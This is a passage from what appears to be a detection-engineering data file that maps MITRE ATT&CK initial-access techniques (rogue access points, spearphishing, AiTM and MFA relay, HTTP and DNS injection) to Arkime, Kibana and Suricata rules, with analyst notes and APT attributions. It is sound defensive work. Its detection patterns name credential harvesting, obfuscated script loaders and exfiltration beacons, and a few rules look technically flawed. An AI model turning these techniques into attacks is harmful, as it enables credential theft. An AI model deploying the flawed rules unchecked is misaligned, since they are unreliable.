  (msg:"TA0001 T1200 Rogue AP
    beaconing corp SSID from
    unauthorized BSSID";
  pkt_data;
  content:"|80 00|"; depth:2;
  classtype:policy-violation;
  sid:9120005; rev:1;)`,
        notes: "Rogue access points beacon a corporate SSID (your Wi-Fi network name) from an unauthorized BSSID (MAC of the AP) to lure users into connecting through adversary-controlled infrastructure for credential harvesting and AiTM. Detection requires wireless monitoring infrastructure - most enterprise WLAN controllers (Cisco WLC, Aruba ClearPass, Meraki, Juniper Mist) include Wireless Intrusion Prevention (WIPS) that automatically detects rogue APs and impersonators. Maintain $AUTHORIZED_BSSIDS as your full enterprise AP MAC list. WiFi Pineapple and similar tools generate distinct beacon patterns. WIPS triggers should pipe to your SIEM. Pair with 802.1X EAP-TLS to make rogue AP exploitation harder (requires stolen client certs).",
        apt: [
          { cls: "apt-ru", name: "APT28", note: "GRU operatives were detained in The Hague in 2018 attempting close-access wireless attacks against the OPCW with a Wi-Fi Pineapple-style device hidden in a vehicle in the parking lot. Documented by Dutch military intelligence." },
          { cls: "apt-mul", name: "Insider", note: "Rogue AP attacks are documented in NSA and CISA wireless security guidance as a primary close-access initial access vector." }
        ],
        cite: "MITRE ATT&CK T1200, T1557, Dutch MIVD reporting"
      },
      {
        sub: "T1200 - LLDP / CDP",
        indicator: "LLDP advertisement from unauthorized device - implant or unauthorized switch announcing presence",
        arkime: `protocols == lldp
&& mac.dst == 01:80:c2:00:00:0e
&& mac.src.oui != $KNOWN_NETWORK_GEAR_OUIS
&& lldp.system-name != $KNOWN_DEVICES`,
        kibana: `network.protocol: "lldp"
AND destination.mac: "01:80:c2:00:00:0e"
AND NOT source.mac.vendor: $APPROVED_NETWORK_VENDORS`,
        suricata: `alert eth any any
  -> 01:80:c2:00:00:0e any
  (msg:"TA0001 T1200 LLDP from
    unauthorized device on network";
  content:"|88 cc|"; offset:12;
  depth:2;
  classtype:policy-violation;
  sid:9120006; rev:1;)`,
        notes: "LLDP (Link Layer Discovery Protocol, EtherType 0x88CC) and CDP (Cisco Discovery Protocol) are used by network devices to advertise their presence and capabilities to neighbors. Most enterprise endpoints don't speak LLDP - only switches, IP phones, APs, and some servers. An LLDP advertisement from an unexpected source MAC is anomalous: either a rogue switch announcing itself, a network implant attempting to participate in network topology, or an unauthorized server. Some implants suppress LLDP/CDP to avoid detection. Zeek's lldp parser (community package) captures LLDP details. Switch port monitoring will see the LLDP advertisements at the access layer. Pair with DHCP OUI detection for correlation.",
        apt: [
          { cls: "apt-mul", name: "Insider", note: "LLDP/CDP-based detection of unauthorized network devices is documented in NSA network defense guidance and Cisco security best practices." },
          { cls: "apt-mul", name: "Multi", note: "Network device self-identification through LLDP can be both a detection asset (rogue devices announcing themselves) and a reconnaissance leak (legitimate devices disclosing topology to compromised neighbors - see T1590.004)." }
        ],
        cite: "MITRE ATT&CK T1200, NSA network defense guidance"
      }
    ]
  },
  {
    id: "T1566",
    name: "Phishing",
    desc: ".001 Attachment · .002 Link · .003 via Service",
    rows: [
      {
        sub: "T1566.001 - Spearphishing Attachment",
        indicator: "Inbound SMTP - password-protected archive or document from newly registered sending domain",
        arkime: `ip.dst == $INTERNAL
&& protocols == smtp
&& smtp.from-domain != $KNOWN_GOOD
&& smtp.attachment-name == [
  *.zip || *.rar || *.7z
  || *.iso || *.img
  || *.doc || *.docx
  || *.xls || *.xlsm
  || *.pdf || *.lnk
  || *.chm
]
&& databytes.src > 50000`,
        kibana: `destination.ip: $INTERNAL
AND network.protocol: smtp
AND NOT source.ip: $KNOWN_MX
AND email.attachments.file.extension: (
  zip OR rar OR 7z OR iso
  OR img OR doc OR docx
  OR xls OR xlsm OR pdf
  OR lnk OR chm
)`,
        suricata: `alert smtp $EXTERNAL_NET any
  -> $HOME_NET 25
  (msg:"TA0001 T1566.001 Inbound
    phishing attachment
    suspicious extension";
  flow:established,to_server;
  content:"Content-Disposition:";
  pcre:"/filename=[\\"\\']?[^\\"\\'\\r\\n]+
    \\.(zip|rar|7z|iso|img|
    docx?|xlsx?m?|pdf|
    lnk|chm)[\\"\\']?/i";
  classtype:trojan-activity;
  sid:9115601; rev:1;)`,
        notes: "Password-protected archives (.zip, .rar, .7z) and disk images (.iso, .img) are the dominant phishing attachment formats - they bypass AV scanning because the scanner cannot read the contents without the password (typically included in the email body). .lnk and .chm files are also high-value finds - both execute code on double-click. Focus on attachments from external senders with no prior mail history to your org. Zeek smtp.log captures MIME headers including filenames. Correlate sending domain age via passive DNS - newly registered MX senders with these attachment types are near-certain malicious. Also watch for mismatched Content-Type (e.g. application/octet-stream labeled as .pdf).",
        apt: [
          { cls: "apt-ru", name: "APT29", note: "Extensively uses password-protected ZIP and ISO attachments to deliver initial access payloads, bypassing email gateway scanning." },
          { cls: "apt-kp", name: "Lazarus", note: "Uses .lnk and .chm files inside archives targeting financial and defense sector employees." },
          { cls: "apt-ir", name: "Charming Kitten", note: "Delivers macro-enabled Office documents and password-protected archives to academic and NGO sector targets." }
        ],
        cite: "MITRE ATT&CK T1566.001, industry reporting"
      },
      {
        sub: "T1566.001 - Spearphishing Attachment",
        indicator: "SMTP attachment with double extension or RTLO character - filename spoofing",
        arkime: `ip.dst == $INTERNAL
&& protocols == smtp
&& smtp.attachment-name == [
  *.pdf.exe || *.doc.exe
  || *.xlsx.exe || *.jpg.exe
  || *\\u202e*
]
&& ip.src != $KNOWN_MX`,
        kibana: `destination.ip: $INTERNAL
AND network.protocol: smtp
AND email.attachments.file.name: (
  *.pdf.exe OR *.doc.exe
  OR *.jpg.exe OR *\\u202e*
)
AND NOT source.ip: $KNOWN_MX`,
        suricata: `alert smtp $EXTERNAL_NET any
  -> $HOME_NET 25
  (msg:"TA0001 T1566.001 SMTP
    attachment double extension
    or RTLO filename spoof";
  flow:established,to_server;
  content:"Content-Disposition:";
  pcre:"/filename=.*?\\.(pdf|doc|
    jpg|png|txt)\\.(exe|scr|
    bat|cmd|vbs|ps1)[\\"\\'\\r\\n]/i";
  classtype:trojan-activity;
  sid:9115602; rev:1;)`,
        notes: "Double extensions (invoice.pdf.exe) and Right-to-Left Override (RTLO, U+202E) characters in filenames make executables appear to be documents. RTLO reverses the display of characters following it - 'invoice_\\u202egpj.exe' displays as 'invoice_exe.jpg' to the user. Both techniques are trivially detectable at the SMTP gateway level. The Unicode U+202E character in a filename is an immediate red flag with virtually no legitimate use case in email attachments. Most email gateways can strip or quarantine these - if you're still seeing them, your gateway needs tuning.",
        apt: [
          { cls: "apt-kp", name: "Kimsuky", note: "Uses RTLO filename spoofing to disguise executable attachments as documents in targeting of South Korean government and policy organization employees." },
          { cls: "apt-ir", name: "APT35", note: "Uses double extension filenames to conceal executable payloads delivered via spearphishing to academic and human rights organization targets." },
          { cls: "apt-mul", name: "Multi", note: "RTLO and double extension spoofing are low-sophistication but effective techniques documented in numerous phishing campaigns." }
        ],
        cite: "MITRE ATT&CK T1566.001, T1036.002, industry reporting"
      },
      {
        sub: "T1566.001 - Spearphishing Attachment",
        indicator: "Remote template injection - outbound DOTX/DOTM fetch immediately after email open",
        arkime: `ip.src == $INTERNAL
&& protocols == http
&& http.method == GET
&& http.uri == [
  *.dotx || *.dotm
  || *.dot || *.xltx
  || *.xltm || *.potx
]
&& ip.dst != $KNOWN_GOOD
&& databytes.dst > 5000`,
        kibana: `source.ip: $INTERNAL
AND http.request.method: GET
AND url.path: (
  *.dotx OR *.dotm OR *.dot
  OR *.xltx OR *.xltm
  OR *.potx
)
AND NOT destination.ip: $KNOWN_GOOD`,
        suricata: `alert http $HOME_NET any
  -> $EXTERNAL_NET any
  (msg:"TA0001 T1566.001 Remote
    template fetch possible
    injection lure";
  flow:established,to_server;
  content:"GET"; http.method;
  pcre:"/\\.(dotx?m?|xltx?m?|
    potx?m?)\\b/i";
  http.uri;
  classtype:trojan-activity;
  sid:9115603; rev:1;)`,
        notes: "Remote template injection embeds a URL in an Office document that fetches a macro-enabled template (.dotm, .xltm) from an external server when the document is opened. The document itself contains no macros - it only fetches them remotely, bypassing static AV scanning. The network signal is a GET request for a .dotx/.dotm/.xltm file from an internal host to an unknown external server - often within seconds of the document being opened. The fetched template contains the actual malicious macro. This technique bypasses email gateway scanning because the original attachment is clean. Correlate with SMTP logs to identify the document that triggered the fetch.",
        apt: [
          { cls: "apt-ru", name: "APT28", note: "Extensively uses remote template injection to deliver macro payloads to government and military targets, embedding template URLs in clean-looking documents that fetch malicious templates on open." },
          { cls: "apt-ir", name: "Charming Kitten", note: "Uses remote template injection against academic and NGO targets, using .dotm templates hosted on adversary infrastructure." },
          { cls: "apt-cn", name: "APT40", note: "Uses remote template injection in targeting of maritime and government sector organizations." }
        ],
        cite: "MITRE ATT&CK T1566.001, T1221, industry reporting"
      },
      {
        sub: "T1566.002 - Spearphishing Link",
        indicator: "Internal host clicking URL in email - GET to newly registered domain within minutes of SMTP delivery",
        arkime: `ip.src == $INTERNAL
&& protocols == http
&& http.method == GET
&& http.referer == *mail*
&& ip.dst != $KNOWN_GOOD
&& dns.host-age < 30d
&& http.user-agent == [
  *Outlook* || *Thunderbird*
  || *Mail* || *Chrome*
  || *Firefox*
]`,
        kibana: `source.ip: $INTERNAL
AND http.request.method: GET
AND http.request.headers.referer: *mail*
AND NOT destination.ip: $KNOWN_GOOD`,
        suricata: `alert http $HOME_NET any
  -> $EXTERNAL_NET any
  (msg:"TA0001 T1566.002 Internal
    host click to unknown domain
    possible phishing link";
  flow:established,to_server;
  content:"GET"; http.method;
  pcre:"/Referer:\\s*https?:\\/\\/
    (mail|outlook|webmail|
    owa)\\./i";
  http.header;
  classtype:trojan-activity;
  sid:9115604; rev:1;)`,
        notes: "The Referer header reveals when a user clicked a link from a webmail interface (mail., outlook., webmail., owa.). Combining the Referer with a destination domain age check <30 days is a high-confidence phishing click indicator. Correlate forward from the click: what did the destination serve? A redirect chain, a credential harvesting page, or a payload download all follow predictably. This is one of the most actionable real-time detections - the click happens before any credentials are entered or payload executes, giving a response window. Alert immediately and correlate with inbound SMTP logs to identify the phishing email.",
        apt: [
          { cls: "apt-ru", name: "Midnight Blizzard", note: "Uses spearphishing links in targeted campaigns against government, technology, and defense sector organizations." },
          { cls: "apt-ir", name: "Charming Kitten", note: "Delivers phishing links via webmail and sends targets to credential harvesting pages, with the click generating a Referer-tagged request to the harvesting infrastructure." },
          { cls: "apt-kp", name: "Kimsuky", note: "Uses spearphishing links against South Korean government targets with similar Referer-visible click patterns." }
        ],
        cite: "MITRE ATT&CK T1566.002, industry reporting"
      },
      {
        sub: "T1566.002 - Spearphishing Link",
        indicator: "Credential POST to external host following phishing link click - active harvest in progress",
        arkime: `ip.src == $INTERNAL
&& protocols == http
&& http.method == POST
&& ip.dst != $KNOWN_GOOD
&& http.post-body == [
  *password=* || *passwd=*
  || *pass=* || *pwd=*
  || *credential* || *login*
]
&& databytes.src > 100
&& databytes.src < 2000`,
        kibana: `source.ip: $INTERNAL
AND http.request.method: POST
AND NOT destination.ip: $KNOWN_GOOD
AND http.request.body: (
  *password=* OR *passwd=*
  OR *pass=* OR *pwd=*
  OR *credential*
)`,
        suricata: `alert http $HOME_NET any
  -> $EXTERNAL_NET any
  (msg:"TA0001 T1566.002 Credential
    POST to external host
    phishing harvest";
  flow:established,to_server;
  content:"POST"; http.method;
  pcre:"/(password|passwd|
    pass|pwd|credential|
    login)=/i";
  http.request_body;
  classtype:trojan-activity;
  sid:9115605; rev:1;)`,
        notes: "A credential POST to an external unknown host is one of the highest-priority network alerts - credentials are actively being submitted to an adversary-controlled harvesting page. POST body size 100-2000 bytes covers typical credential form submissions (username + password) while filtering out large form submissions. This fires after the victim has already entered their credentials - immediate response required. Identify which user submitted, what credentials (email domain suggests the service), and whether MFA is in use. Correlate with upstream: was there a phishing click (Referer) in the minutes preceding this POST? Check for AiTM proxy patterns in the response (anomalous cookies, JA4S mismatch).",
        apt: [
          { cls: "apt-ru", name: "Midnight Blizzard", note: "Credential harvesting operations generate POST-to-external patterns from victim hosts, with the POST containing Office 365 or Azure AD credentials to adversary-controlled infrastructure." },
          { cls: "apt-mul", name: "Scattered Spider", note: "Uses AiTM infrastructure that proxies credential POSTs to legitimate IdPs while capturing credentials in transit." },
          { cls: "apt-ir", name: "Charming Kitten", note: "Credential harvesting pages receive POST submissions from targeted academic and NGO sector users." }
        ],
        cite: "MITRE ATT&CK T1566.002, T1598.003, CISA advisories"
      },
      {
        sub: "T1566.002 - Spearphishing Link",
        indicator: "AiTM phishing proxy - session cookie harvest via reverse proxy to legitimate IdP",
        arkime: `ip.src == $INTERNAL
&& protocols == tls
&& tls.cert-cn == [
  *microsoft* || *office365*
  || *google* || *okta*
  || *ping* || *duo*
  || *azure*
]
&& tls.ja3s != $KNOWN_IDPS_JA4S
&& tls.cert-notbefore >= now-14d
&& ip.dst != $KNOWN_IDPS`,
        kibana: `source.ip: $INTERNAL
AND NOT destination.ip: $KNOWN_IDPS
AND tls.server.x509.subject.common_name: (
  *microsoft* OR *office365*
  OR *google* OR *okta*
  OR *azure* OR *duo*
)
AND tls.server.not_before:
  [now-14d TO now]`,
        suricata: `alert tls $HOME_NET any
  -> $EXTERNAL_NET any
  (msg:"TA0001 T1566.002 AiTM
    proxy IdP cert CN mismatch
    session harvest";
  flow:established,to_server;
  tls.cert_subject;
  pcre:"/CN=[^,]*(microsoft|
    office365|google|okta|
    azure|duo|ping)/i";
  classtype:trojan-activity;
  sid:9115606; rev:1;)`,
        notes: "AiTM phishing proxies (Evilginx2, Modlishka, Muraena) present TLS certificates with CNs mimicking legitimate IdPs (Microsoft, Google, Okta) while proxying traffic to the real IdP - capturing session cookies after MFA completes. Detection: the certificate CN claims to be a known IdP but the destination IP is not a known IdP IP range, and the JA4S fingerprint differs from legitimate IdP TLS server responses. A new certificate (<14 days old) claiming to be Microsoft or Okta from an unknown IP is near-certain AiTM infrastructure. Build a JA4S allowlist for your legitimate IdPs and alert on any deviation from a host claiming to serve their CN.",
        apt: [
          { cls: "apt-ru", name: "Midnight Blizzard", note: "Uses Evilginx2-based AiTM infrastructure to harvest session cookies from Microsoft 365 authentication flows, bypassing MFA by capturing post-authentication session tokens." },
          { cls: "apt-mul", name: "Scattered Spider", note: "Deploys AiTM phishing infrastructure against technology and hospitality sector targets, using Evilginx2 and custom proxies to harvest Okta and Azure AD session cookies." },
          { cls: "apt-ir", name: "Charming Kitten", note: "Uses AiTM proxies targeting Google Workspace authentication for academic and NGO sector targets." }
        ],
        cite: "MITRE ATT&CK T1566.002, T1539, industry reporting"
      },
      {
        sub: "T1566.002 - Spearphishing Link",
        indicator: "OTP / MFA relay - rapid token submission to legitimate IdP immediately after phishing click",
        arkime: `ip.src == $INTERNAL
&& protocols == https
&& http.method == POST
&& http.host == [
  *login.microsoftonline.com*
  || *accounts.google.com*
  || *okta.com*
  || *duo.com*
]
&& http.post-body == [
  *otc=* || *otp=*
  || *token=* || *code=*
  || *mfa=* || *totp=*
]
&& starttime - prev.starttime
  < 60s`,
        kibana: `source.ip: $INTERNAL
AND http.request.method: POST
AND url.domain: (
  *login.microsoftonline.com*
  OR *accounts.google.com*
  OR *okta.com* OR *duo.com*
)
AND http.request.body: (
  *otc=* OR *otp=*
  OR *token=* OR *code=*
)`,
        suricata: `alert http $HOME_NET any
  -> $EXTERNAL_NET 443
  (msg:"TA0001 T1566.002 MFA token
    POST to IdP possible OTP
    relay";
  flow:established,to_server;
  content:"POST"; http.method;
  pcre:"/(login\\.microsoftonline|
    accounts\\.google|
    okta\\.com|duo\\.com)/i";
  http.header;
  pcre:"/(otc|otp|token|code|
    mfa|totp)=/i";
  http.request_body;
  classtype:trojan-activity;
  sid:9115607; rev:1;)`,
        notes: "Real-time MFA relay attacks prompt the victim to enter their OTP, which the adversary immediately submits to the legitimate IdP before it expires. The network signal is an MFA token POST to a legitimate IdP coming from an internal host in the immediate aftermath of a phishing link click. Timing correlation is key - an MFA POST within 60 seconds of a phishing-Referer-tagged HTTP request is a strong signal. Also watch for MFA fatigue attacks: repeated push notification approvals (POST to duo.com or okta.com) from a user who isn't actively logging in. Correlate with your IdP logs for the same user simultaneously authenticating from two geographic locations.",
        apt: [
          { cls: "apt-ru", name: "APT29", note: "Uses real-time OTP relay in credential harvesting operations, prompting victims to enter MFA codes that are immediately relayed to Microsoft 365 authentication infrastructure." },
          { cls: "apt-mul", name: "Scattered Spider", note: "Conducts MFA fatigue and real-time relay attacks against technology and hospitality sector targets using both push notification fatigue and real-time OTP relay." },
          { cls: "apt-mul", name: "Multi", note: "Real-time MFA relay is documented in CISA and FBI advisories as an increasingly common technique used by both nation-state and criminal actors to bypass MFA." }
        ],
        cite: "MITRE ATT&CK T1566.002, T1621, CISA advisories"
      },
      {
        sub: "T1566.003 - Spearphishing via Service",
        indicator: "Internal host connecting to social platform / messaging API immediately after receiving DM",
        arkime: `ip.src == $INTERNAL
&& protocols == https
&& http.host == [
  *linkedin.com*
  || *twitter.com* || *x.com*
  || *discord.com*
  || *slack.com*
  || *teams.microsoft.com*
  || *telegram.org*
  || *whatsapp.com*
]
&& http.method == GET
&& http.uri == [
  */redirect* || */url*
  || */link* || */click*
  || */track*
]`,
        kibana: `source.ip: $INTERNAL
AND url.domain: (
  *linkedin.com* OR *twitter.com*
  OR *discord.com* OR *slack.com*
  OR *teams.microsoft.com*
  OR *telegram.org*
)
AND url.path: (
  *redirect* OR */url*
  OR */link* OR */click*
  OR */track*
)`,
        suricata: `alert http $HOME_NET any
  -> $EXTERNAL_NET any
  (msg:"TA0001 T1566.003 Social
    platform redirect click
    possible spearphishing";
  flow:established,to_server;
  pcre:"/Host:\\s*(linkedin|
    twitter|x\\.com|discord|
    slack|teams\\.microsoft|
    telegram)\\.com/i";
  http.header;
  pcre:"/(redirect|\\/url|
    \\/link|\\/click|
    \\/track)/i";
  http.uri;
  classtype:trojan-activity;
  sid:9115608; rev:1;)`,
        notes: "Spearphishing via service uses trusted platforms (LinkedIn, Teams, Discord, Slack, Telegram) to deliver phishing links, bypassing email gateway controls entirely. The network signal is a redirect click through the platform's link tracking system - LinkedIn uses /redirect/, Twitter uses t.co, Discord uses discord.com/channels/ with external links, Teams uses teams.microsoft.com/l/. The redirect leads to the actual phishing payload. Detection requires SSL/TLS inspection at the proxy layer to see the URL paths. Correlate the redirect destination with newly registered domain indicators and threat intel. LinkedIn is the primary vector for Lazarus and Kimsuky social engineering.",
        apt: [
          { cls: "apt-kp", name: "Lazarus", note: "Uses LinkedIn extensively for Operation Dream Job social engineering, sending malicious links via DM that generate redirect-click network signals." },
          { cls: "apt-kp", name: "Kimsuky", note: "Uses social platform messaging to deliver phishing links to South Korean government and research targets, bypassing email gateway controls." },
          { cls: "apt-ir", name: "Charming Kitten", note: "Uses LinkedIn, Twitter, and Telegram to deliver phishing links to academic and policy sector targets." }
        ],
        cite: "MITRE ATT&CK T1566.003, industry reporting"
      }
    ]
  },
  {
    id: "T1659",
    name: "Content Injection",
    desc: "HTTP response injection · DNS injection · BGP hijack · TLS downgrade",
    rows: [
      {
        sub: "T1659 - HTTP Response Injection - Drive-by",
        indicator: "Injected JavaScript in HTTP response from legitimate site - on-path content modification",
        arkime: `ip.dst == $INTERNAL
&& protocols == http
&& http.statuscode == 200
&& http.response-header == [
  *text/html*
  || *application/javascript*
]
&& http.response-body == [
  *<script*src=*//*.tk*
  || *<script*src=*//*.xyz*
  || *<script*src=*//*newdomain*
  || *eval(atob(*
  || *document.write*
    *unescape*
]
&& ip.src == $KNOWN_GOOD`,
        kibana: `destination.ip: $INTERNAL
AND http.response.status_code: 200
AND http.response.headers.content-type: (
  *text/html*
  OR *application/javascript*
)
AND http.response.body: (
  *eval(atob(* OR *document.write*unescape*
  OR *<script*src=*//*.tk*
  OR *<script*src=*//*.xyz*
)
AND source.ip: $KNOWN_GOOD`,
        suricata: `alert http $EXTERNAL_NET any
  -> $HOME_NET any
  (msg:"TA0001 T1659 HTTP response
    script injection in legitimate
    site possible on-path mod";
  flow:established,from_server;
  content:"200"; http.stat_code;
  content:"text/html"; http.header;
  file_data;
  pcre:"/<script[^>]+src\\s*=\\s*
    [\\"\\']https?:\\/\\/[a-z0-9\\-]+\\.
    (tk|ml|ga|cf|xyz|top|club|
    online|site|live|fun|pw|cc)/i";
  classtype:trojan-activity;
  sid:9165901; rev:1;)`,
        notes: "Adversaries with on-path access (compromised CDN, ISP-level injection, compromised proxy, hostile Wi-Fi) inject JavaScript into legitimate HTTP responses to deliver exploits or harvest credentials. The injected script typically loads from a newly registered or low-reputation domain. Detection requires inspecting response bodies - HTTPS prevents this except where you have TLS inspection, so this primarily catches HTTP traffic to legitimate sites that should be HTTPS. eval(atob()) and document.write(unescape()) are obfuscation patterns common in injected payloads. Compare response content against known-good baselines for high-value sites. Subresource Integrity (SRI) on legitimate sites prevents injection by verifying script hashes - alert when SRI is missing on critical pages.",
        apt: [
          { cls: "apt-mul", name: "Axiom", note: "On-path injection capability documented in attribution to Chinese intelligence operations against telecommunications providers and ISPs." },
          { cls: "apt-cn", name: "APT3", note: "Used compromised CDN infrastructure to inject content into responses served to victim browsers in watering hole operations." },
          { cls: "apt-ir", name: "APT33", note: "Documented capability for HTTP response injection in operations against energy sector targets." },
          { cls: "apt-mul", name: "Multi", note: "On-path content injection requires either ISP/CDN compromise, hostile network position (rogue AP), or BGP/DNS manipulation - all documented in CISA and NSA telecommunications security advisories." }
        ],
        cite: "MITRE ATT&CK T1659, T1557, CISA telecom advisories"
      },
      {
        sub: "T1659 - HTTP Response Injection - Drive-by",
        indicator: "HTTP Content-Length mismatch - injected payload exceeds declared length",
        arkime: `protocols == http
&& http.response-header == *Content-Length*
&& session.databytes != http.content-length
&& abs(session.databytes -
  http.content-length) > 100`,
        kibana: `network.protocol: http
AND _exists_:
  http.response.headers.content_length
AND http.response.body.bytes != http.response.headers.content_length`,
        suricata: `alert http $EXTERNAL_NET any
  -> $HOME_NET any
  (msg:"TA0001 T1659 HTTP Content
    Length mismatch possible
    response injection";
  flow:established,from_server;
  content:"Content-Length:";
  http.header;
  byte_test:0,>,1024,
    0,relative,string;
  file_data;
  byte_extract:0,0,actual_len;
  classtype:trojan-activity;
  sid:9165902; rev:1;)`,
        notes: "Response injection often produces a length mismatch between the Content-Length header (set by the original server) and the actual delivered body (modified by the on-path injector). Most modern HTTP libraries handle Content-Length correctly so any mismatch is anomalous. Combined with smuggling-style discrepancies (TE.CL, CL.TE) this is a strong indicator of response tampering. Zeek http.log captures both the declared and actual response sizes - query for sessions where these diverge significantly (>100 bytes). Some legitimate causes exist (proxies that recompress, CDNs that modify), so baseline these and exclude known-good infrastructure before alerting.",
        apt: [
          { cls: "apt-mul", name: "Multi", note: "HTTP response tampering and content injection are documented techniques requiring on-path network position. The Content-Length mismatch detection method is documented in academic security research and Zeek detection cookbooks." }
        ],
        cite: "MITRE ATT&CK T1659, industry reporting"
      },
      {
        sub: "T1659 - HTTP Response Injection - Collection / C2",
        indicator: "Internal HTTP JavaScript beacon - east-west response injection for credential or data collection",
        arkime: `ip.src == $INTERNAL
&& ip.dst == $INTERNAL
&& protocols == http
&& http.response-body == [
  *new Image()*
    *.src=*location*
  || *XMLHttpRequest*
    *POST*
  || *fetch(*
    *credentials*
  || *navigator.sendBeacon*
]
&& http.response-header == *text/html*`,
        kibana: `source.ip: $INTERNAL
AND destination.ip: $INTERNAL
AND network.protocol: http
AND http.response.body: (
  *new Image()*location*
  OR *XMLHttpRequest*POST*
  OR *fetch(*credentials*
  OR *navigator.sendBeacon*
)`,
        suricata: `alert http $HOME_NET any
  -> $HOME_NET any
  (msg:"TA0001 T1659 East-west HTTP
    JS beacon possible internal
    response injection";
  flow:established,from_server;
  content:"text/html"; http.header;
  file_data;
  pcre:"/(new\\s+Image\\(\\)\\.src\\s*=\\s*
    [\\"\\']?http|XMLHttpRequest.{0,50}
    \\.(open|send)|fetch\\s*\\([\\"\\'])/i";
  classtype:trojan-activity;
  sid:9165903; rev:1;)`,
        notes: "Internal-to-internal HTTP responses containing JavaScript beacon code suggest an internal application has been compromised to inject content into responses served to internal users. Common beacon patterns: new Image().src='http://...' (sends GET request via image load), XMLHttpRequest+POST (sends data via XHR), fetch() with credentials, navigator.sendBeacon() (designed for analytics, abused for exfil). The injection might come from a compromised internal web app, an ad/analytics tag in an internal CMS, or an attacker-modified template. Particularly important for internal SharePoint, Confluence, and CMS deployments which serve content to many users.",
        apt: [
          { cls: "apt-cn", name: "APT41", note: "Has compromised internal web applications to inject content harvesting credentials and session data from internal users." },
          { cls: "apt-ru", name: "Sandworm", note: "Documented compromise of internal web infrastructure in operations against Ukrainian organizations, with content injection enabling credential collection." },
          { cls: "apt-mul", name: "Multi", note: "Internal web compromise leading to client-side content injection is documented in incident reports of multiple breaches involving compromised SharePoint, Confluence, and intranet CMS deployments." }
        ],
        cite: "MITRE ATT&CK T1659, T1505.003, industry reporting"
      },
      {
        sub: "T1659 - HTTP Response Injection - Collection / C2",
        indicator: "Third-party script tag from new / unauthorized source on internal application",
        arkime: `ip.src == $INTERNAL_WEB_APPS
&& protocols == http
&& http.response-header == *text/html*
&& http.response-body == [
  *<script*src=*//*
]
&& http.response-body !=
  $APPROVED_SCRIPT_SOURCES`,
        kibana: `source.ip: $INTERNAL_WEB_APPS
AND http.response.headers.content-type:
  *text/html*
AND http.response.body:
  *<script src=*//*
AND NOT http.response.body:
  $APPROVED_SCRIPT_SOURCES`,
        suricata: `alert http $INTERNAL_WEB_APPS any
  -> $HOME_NET any
  (msg:"TA0001 T1659 New third-party
    script source on internal app
    possible injection";
  flow:established,from_server;
  content:"text/html"; http.header;
  file_data;
  pcre:"/<script[^>]+src\\s*=\\s*
    [\\"\\']https?:\\/\\/(?!yourcdn|
    yourdomain)[^\\\"\\']+/i";
  classtype:trojan-activity;
  sid:9165904; rev:1;)`,
        notes: "Internal applications should serve scripts from a defined set of sources - your CDN, jsdelivr, unpkg, cloudflare, your own domain. New third-party script sources appearing on internal applications indicate injection - either via compromised application code, malicious CMS plugin, or modified template. Maintain $APPROVED_SCRIPT_SOURCES allowlist of legitimate script source domains. Implement Content Security Policy (CSP) headers on internal apps to enforce script source allowlisting at the browser level - CSP violations are also an excellent detection signal (CSP report-uri telemetry). Particularly relevant for WordPress, Drupal, and other CMS deployments where plugin compromise is common.",
        apt: [
          { cls: "apt-cn", name: "APT41", note: "Has injected malicious script sources into compromised internal web applications for credential harvesting and session collection." },
          { cls: "apt-ru", name: "APT29", note: "Documented compromise of internal web infrastructure with script injection in SolarWinds-related operations." },
          { cls: "apt-mul", name: "Multi", note: "CMS compromise leading to script injection is the basis of magecart attacks against e-commerce and is documented in numerous PCI security advisories." }
        ],
        cite: "MITRE ATT&CK T1659, T1189, industry reporting"
      },
      {
        sub: "T1659 - DNS Response Injection",
        indicator: "DNS response with TTL=0 or anomalously low TTL - possible response injection",
        arkime: `protocols == dns
&& dns.response == true
&& dns.ttl < 30
&& dns.host != [
  *cdn* || *akamai*
  || *cloudflare* || *fastly*
  || *amazonaws*
]`,
        kibana: `network.protocol: dns
AND dns.type: response
AND dns.answers.ttl: [0 TO 30]
AND NOT dns.answers.name: (
  *cdn* OR *akamai*
  OR *cloudflare* OR *fastly*
  OR *amazonaws*
)`,
        suricata: `alert dns any 53
  -> $HOME_NET any
  (msg:"TA0001 T1659 DNS response
    anomalous TTL possible
    injection";
  flow:stateless;
  dns.response;
  byte_test:4,<,30,
    8,relative,big;
  classtype:trojan-activity;
  sid:9165905; rev:1;)`,
        notes: "On-path DNS injection (DNS spoofing) typically uses very low TTLs (often 0) so the malicious response isn't cached long enough to be detected. Legitimate low TTLs occur on CDN endpoints (Akamai, Cloudflare, Fastly, AWS) which use DNS-based load balancing - these need to be excluded from the alert. Anomalously low TTLs on non-CDN domains, especially for high-value targets (banking sites, IdPs, internal infrastructure), suggest response injection. Combine with detection of duplicate DNS responses (the legitimate response arriving after the injected one). Pair with DNSSEC validation telemetry - DNS injection cannot survive DNSSEC validation, so signed-domain validation failures correlate strongly.",
        apt: [
          { cls: "apt-cn", name: "APT10", note: "Has demonstrated DNS-based on-path attack capability in operations against telecommunications and MSP infrastructure during Cloud Hopper." },
          { cls: "apt-ir", name: "APT33", note: "Has used DNS hijacking against energy sector targets, redirecting authentication traffic to credential harvesting infrastructure." },
          { cls: "apt-mul", name: "Multi", note: "DNS injection attacks (DNSpionage, Sea Turtle) are documented in CISA Emergency Directive 19-01 and FBI advisories on DNS infrastructure tampering." }
        ],
        cite: "MITRE ATT&CK T1659, T1557, CISA ED-19-01"
      },
      {
        sub: "T1659 - DNS Response Injection",
        indicator: "Duplicate DNS responses - race condition between legitimate and injected response",
        arkime: `protocols == dns
&& dns.response == true
&& dns.transaction-id ==
  prev.dns.transaction-id
&& dns.host == prev.dns.host
&& dns.answer != prev.dns.answer
&& starttime - prev.starttime
  < 1s`,
        kibana: `network.protocol: dns
AND dns.type: response
AND _exists_: dns.id`,
        suricata: `alert dns any 53
  -> $HOME_NET any
  (msg:"TA0001 T1659 Duplicate DNS
    response possible injection
    race";
  flow:stateless;
  dns.response;
  threshold:type both,
    track by_dst,
    count 2, seconds 1;
  classtype:trojan-activity;
  sid:9165906; rev:1;)`,
        notes: "DNS injection attacks race the legitimate DNS server - the adversary's spoofed response arrives at the victim resolver before the legitimate response. The legitimate response then arrives second and is silently discarded by the resolver. Network-level capture sees both responses with the same transaction ID, same query, but different answers. Zeek dns.log captures all DNS traffic including duplicates. Build detection that joins responses by transaction ID and resolver, alerting when the same query yields different answers within 1 second. This is a near-zero false positive indicator outside of legitimate DNS load balancers - and those should be in your $KNOWN_GOOD_DNS list.",
        apt: [
          { cls: "apt-cn", name: "APT10", note: "Documented DNS injection capability in MSP-targeted operations." },
